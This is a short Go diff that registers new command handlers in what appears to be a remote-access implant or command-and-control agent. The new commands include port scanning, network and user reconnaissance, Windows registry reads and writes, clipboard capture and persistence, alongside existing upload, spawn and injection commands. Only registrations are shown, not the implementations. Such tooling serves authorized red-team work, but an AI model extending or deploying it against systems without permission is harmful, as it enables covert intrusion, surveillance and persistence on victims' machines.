@@ -34,6 +34,12 @@ func Initialize() {
 	RegisterCommand(&UploadCommand{})
 	RegisterCommand(&EnvCommand{})
 	RegisterCommand(&ExitCommand{})
+	RegisterCommand(&KillCommand{})
+	RegisterCommand(&WhoamiCommand{})
+	RegisterCommand(&IfconfigCommand{})
+	RegisterCommand(&FindCommand{})
+	RegisterCommand(&NetstatCommand{})
+	RegisterCommand(&PortScanCommand{})
 
 	// Register Windows-specific commands
 	if runtime.GOOS == "windows" {
@@ -54,6 +60,10 @@ func Initialize() {
 		RegisterCommand(&ScreenshotCommand{})
 		RegisterCommand(&SpawnCommand{})
 		RegisterCommand(&OpusInjectionCommand{})
+		RegisterCommand(&RegReadCommand{})
+		RegisterCommand(&RegWriteCommand{})
+		RegisterCommand(&ClipboardCommand{})
+		RegisterCommand(&PersistCommand{})
 	}
 
 	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
